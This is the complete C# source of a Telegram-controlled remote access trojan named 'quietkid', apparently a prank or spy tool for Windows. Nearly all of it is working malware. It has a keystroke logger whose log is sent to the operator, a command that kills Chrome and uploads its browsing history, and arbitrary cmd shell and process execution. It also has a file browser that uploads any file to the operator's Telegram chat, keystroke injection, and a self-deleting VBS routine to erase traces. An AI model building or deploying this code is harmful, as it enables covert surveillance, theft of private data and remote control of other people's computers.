using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;
using File = System.IO.File;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using Keystroke.API;
using System.Media;

namespace quietkid
{
    static class Data
    {
        public enum ConversationStatus
        {
            awaiting,
            plain,
            webload,
            process,
            shell,
            finder,
            spam,
            sound,
            ascii
        }
    }
    public class Action
    {
        
        const string version = "4.0.0";

        static string keyLog = "";
        static bool isLogging = false;
        static string currentDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        private static TelegramBotClient Bot;
        private static Data.ConversationStatus status = Data.ConversationStatus.awaiting;
        static Stopwatch watch = Stopwatch.StartNew();
        [STAThread]
        static async Task Main()
        {
            Bot = new TelegramBotClient(Secure.tokenNose.ToString() + Secure.tokenTail);

            Bot.OnMessage += BotOnMessageReceived;
            Bot.OnReceiveError += BotOnReceiveError;

            Bot.StartReceiving(Array.Empty<UpdateType>());
            await Awake();
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) =>
                {
                    if (isLogging)
                    {
                        keyLog += character.ToString();
                    }
                });
                Application.Run();
            }
            while (true) ;
        }
        private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs)
        {
            var message = messageEventArgs.Message;
            if (message == null || message.Type != MessageType.Text || message.Chat.Id != Secure.me)
                return;

            switch (message.Text)
            {
                case "/volup":
                    Process.Start("sndvol");
                    await Task.Delay(1000);
                    await InsertPlain("+{TAB}{TAB}{PGUP}{PGUP}{PGUP}{PGUP}{PGUP}%{F4}");
                    break;
                case "/sound":
                    await Switch(Data.ConversationStatus.sound);
                    break;
                case "/ascii":
                    await Switch(Data.ConversationStatus.ascii);
                    break;
                case "/proc":
                    await Switch(Data.ConversationStatus.process);
                    break;
                case "/basic":
                    await Bot.SendTextMessageAsync(
                       chatId: Secure.me,
                       text: $"FDS v{version}\nMachine {Environment.MachineName}:\nOS version: {Environment.OSVersion}\nTime since FDS launch: {watch.ElapsedMilliseconds / 1000}s"
                    );
                    break;
                case "/finder":
                    currentDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\";
                    await Switch(Data.ConversationStatus.finder);
                    break;
                case "/shell":
                    await Switch(Data.ConversationStatus.shell);
                    break;
                case "/hook":
                    isLogging = !isLogging;
                    await Bot.SendTextMessageAsync(
                        chatId: Secure.me,
                        text: "Logging set to " + isLogging.ToString()
                    );
                    break;
                case "/hookdump":
                    if (!isLogging || keyLog == "")
                    {
                        await Bot.SendTextMessageAsync(
                        chatId: Secure.me,
                        text: "!! Logging is off or log is empty"
                        );
                        break;
                    }
                    await Bot.SendTextMessageAsync(
                        chatId: Secure.me,
                        text: keyLog
                    );
                    keyLog = "";
                    break;
                case "/close":
                    await InsertPlain("%{F4}");
                    break;
                case "/chromedump":
                    await ShellExec("taskkill /f /t /im chrome.exe");
                    Thread.Sleep(1000);
                    await SendDocument($@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google\Chrome\User Data\Default\History");
                    break;
                case "/plain":
                    await Switch(Data.ConversationStatus.plain);
                    break;
                case "/rep":
                    await Switch(Data.ConversationStatus.spam);
                    break;
                case "/webload":
                    await Switch(Data.ConversationStatus.webload);
                    break;
                case "/wipe":
                    await InsertPlain("^a");
                    await InsertPlain("{BS}");
                    break;
                case "/kill":
                    await Bot.SendTextMessageAsync(
                        chatId: Secure.me,
                        text: "👋"
                    );
                    await Task.Delay(1000);
                    Environment.Exit(0);
                    break;
                case "/destruct":
                    await Bot.SendTextMessageAsync(
                        chatId: Secure.me,
                        text: "💃"
                    );
                    string Body = "Set fso = CreateObject(\"Scripting.FileSystemObject\"): On error resume next: Dim I: I = 0" + Environment.NewLine + "Set File = FSO.GetFile(\"" + Application.ExecutablePath + "\"): Do while I = 0: fso.DeleteFile (\"" + Application.ExecutablePath + "\"): fso.DeleteFile (\"" + Environment.CurrentDirectory + "\\1.vbs\"): " + Environment.NewLine + "If FSO.FileExists(File) = false Then: I = 1: End If: Loop";
                    File.WriteAllText(Environment.CurrentDirectory + "\\1.vbs", Body, System.Text.Encoding.Default);
                    Process.Start(Environment.CurrentDirectory + "\\1.vbs");
                    await Task.Delay(1000);
                    Environment.Exit(0);
                    break;
                default:
                    await Perform();
                    break;
            }

            async Task Perform()
            {
                try
                {
                    switch (status)
                    {
                        case Data.ConversationStatus.ascii:
                            switch (message.Text)
                            {
                                case "shrek":
                                    await InsertPlain(Properties.Resources.shrek);
                                    break;
                                case "toucan":
                                    await InsertPlain(Properties.Resources.toucan);
                                    break;
                                case "patrick":
                                    await InsertPlain(Properties.Resources.patrick);
                                    break;
                                case "patrickBack":
                                    await InsertPlain(Properties.Resources.patrickBack);
                                    break;
                                case "amogus":
                                    await InsertPlain(Properties.Resources.amogus);
                                    break;
                                default:
                                    throw new Exception("Unknown ascii");
                            }
                            break;
                        case Data.ConversationStatus.sound:
                            SoundPlayer audio = new SoundPlayer();
                            switch (message.Text)
                            {
                                case "among":
                                    audio = new SoundPlayer(Properties.Resources.among);
                                    break;
                                case "fart":
                                    audio = new SoundPlayer(Properties.Resources.fartWithReverb);
                                    break;
                                case "baba":
                                    audio = new SoundPlayer(Properties.Resources.bababooey);
                                    break;
                                case "kudasai":
                                    audio = new SoundPlayer(Properties.Resources.kudasai);
                                    break;
                                case "bruh":
                                    audio = new SoundPlayer(Properties.Resources.bruh);
                                    break;
                                default:
                                    throw new Exception("Unknown sound");
                            }
                            audio.Play();
                            break;
                        case Data.ConversationStatus.webload:
                            ProcessStartInfo prc = new ProcessStartInfo("cmd", @"/c start http://" + message.Text);
                            Process.Start(prc);
                            break;
                        case Data.ConversationStatus.plain:
                            await InsertPlain(message.Text);
                            break;
                        case Data.ConversationStatus.spam:
                            for (int i = 0; i < 20; i++)
                            {
                                await InsertPlain(message.Text + "\n");
                            }
                            break;
                        case Data.ConversationStatus.finder:
                            if (message.Text == "U")
                            {
                                currentDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                                await DirDump();
                            }
                            else if (message.Text == "B")
                            {
                                var dir = currentDir.Split(Path.DirectorySeparatorChar).ToList();
                                dir.RemoveAt(dir.Count - 1);
                                currentDir = string.Join(@"\", dir);
                                await DirDump();
                            }
                            else if (message.Text.Contains("S"))
                            {
                                string disk = message.Text.Replace("S", "");
                                currentDir = $@"{disk}:\\";
                                await DirDump();
                            }
                            else if (int.TryParse(message.Text, out int a))
                            {
                                await DirSwitch(a);
                            }
                            else
                            {
                                currentDir = message.Text;
                                await DirSwitch(currentDir);
                            }
                            break;
                        case Data.ConversationStatus.shell:
                            await ShellExec(message.Text);
                            break;
                        case Data.ConversationStatus.process:
                            Process.Start(message.Text);
                            break;
                        default:
                            await Bot.SendTextMessageAsync(
                               chatId: Secure.me,
                               text: "!! Unknown"
                            );
                            break;
                    }
                }
                catch (Exception ex)
                {
                    await ReportException(ex);
                }
            }

            async Task ShellExec(string arg)
            {
                ProcessStartInfo prcss = new ProcessStartInfo("cmd", @"/c " + arg);
                Process.Start(prcss);
            }

            async Task Switch(Data.ConversationStatus to)
            {
                if (to != status)
                {
                    await Bot.SendTextMessageAsync(
                        chatId: Secure.me,
                        text: $"Now in {to} mode."
                    );
                    status = to;
                }
                else
                {
                    await Bot.SendTextMessageAsync(
                        chatId: Secure.me,
                        text: $"!! Already {to}."
                    );
                }
            }

            async Task InsertPlain(string keys)
            {
                SendKeys.SendWait(keys);
            }
        }
        static async Task Awake()
        {
            await Bot.SendTextMessageAsync(
                chatId: Secure.me,
                text: $"Machine {Environment.MachineName} ruled by {Environment.UserName} is now online"
            );
        }
        static async Task ReportException(Exception ex)
        {
            await Bot.SendTextMessageAsync(
                chatId: Secure.me,
                text: $"!! Exception caught: {ex.Message}"
            );
        }

        static async Task SendDocument(string filePath)
        {
            try
            {
                await Bot.SendChatActionAsync(Secure.me, ChatAction.UploadDocument);
                var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);
                var cast = filePath.Split(Path.DirectorySeparatorChar).Last();
                var fileName = cast.Contains(".") ? cast : cast + ".txt";
                await Bot.SendDocumentAsync(
                    chatId: Secure.me,
                    document: new InputOnlineFile(fileStream, fileName),
                    caption: "Here you go"
                );
            }
            catch (Exception ex)
            {
                await ReportException(ex);
            }
        }
        static async Task DirDump()
        {
            string concat = currentDir.Split(Path.DirectorySeparatorChar).Last() + ":\n";
            int offset = 0;
            int mark;

            for (int j = -1; j < Directory.GetFileSystemEntries(currentDir).Length / 44; j++)
            {
                mark = offset + 1;
                for (int i = offset; i < Directory.GetFileSystemEntries(currentDir).Length; i++)
                {
                    string file = Directory.GetFileSystemEntries(currentDir)[i];
                    FileAttributes fileAttribute = File.GetAttributes(file);
                    if ((fileAttribute & FileAttributes.Hidden) <= 0 && (fileAttribute & FileAttributes.Directory) <= 0)
                    {
                        concat += "   " + mark.ToString() + ". " + file.Split(Path.DirectorySeparatorChar).Last() + " [" +
                            new FileInfo(file).Length + "b]\n";
                        mark++;
                    }
                    else if ((fileAttribute & FileAttributes.Directory) > 0)
                    {
                        concat += "* " + mark.ToString() + ". " + file.Split(Path.DirectorySeparatorChar).Last() + "\n";
                        mark++;
                    }
                    if (mark > offset + 45)
                    {
                        break;
                    }
                }
                await Bot.SendTextMessageAsync(
                    chatId: Secure.me,
                    text: concat
                );
                offset += 44;
                concat = "";
            }
        }

        static async Task DirSwitch(int index)
        {
            List<string> entries = new List<string> { };
            foreach (var file in Directory.GetFileSystemEntries(currentDir))
            {
                FileAttributes fileAttribute = File.GetAttributes(file);
                if (((fileAttribute & FileAttributes.Hidden) <= 0 && (fileAttribute & FileAttributes.Directory) <= 0) || (fileAttribute & FileAttributes.Directory) > 0)
                {
                    entries.Add(file);
                }
            }
            string to = entries[index - 1];
            FileAttributes fileReceivedAttribute = File.GetAttributes(entries[index - 1]);
            if ((fileReceivedAttribute & FileAttributes.Directory) > 0)
            {
                currentDir = to;
                await DirDump();
            }
            else
            {
                currentDir = to;
                await SendDocument(to);
            }
        }

        static async Task DirSwitch(string to)
        {
            FileAttributes fileReceivedAttribute = File.GetAttributes(to);
            if ((fileReceivedAttribute & FileAttributes.Directory) > 0)
            {
                currentDir = to;
                await DirDump();
            }
            else
            {
                currentDir = to;
                await SendDocument(to);
            }
        }
        private static void BotOnReceiveError(object sender, ReceiveErrorEventArgs receiveErrorEventArgs)
        {
            Bot.SendTextMessageAsync(
                chatId: Secure.me,
                text: $"Received error: {receiveErrorEventArgs.ApiRequestException.ErrorCode}, {receiveErrorEventArgs.ApiRequestException.Message}"
            );
            Environment.Exit(1);
        }
    }
}